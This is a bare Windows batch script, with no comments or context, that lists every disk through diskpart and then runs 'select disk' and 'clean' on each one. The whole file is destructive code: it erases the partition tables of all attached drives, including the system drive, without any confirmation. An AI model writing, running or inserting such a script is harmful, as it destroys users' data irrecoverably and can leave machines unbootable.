@echo off
for /f "tokens=2" %%a in ('echo list disk ^| diskpart ^| findstr /c:"Disk"') do (
    (
    echo select disk %%a
    echo clean
    echo exit
    ) | diskpart
)
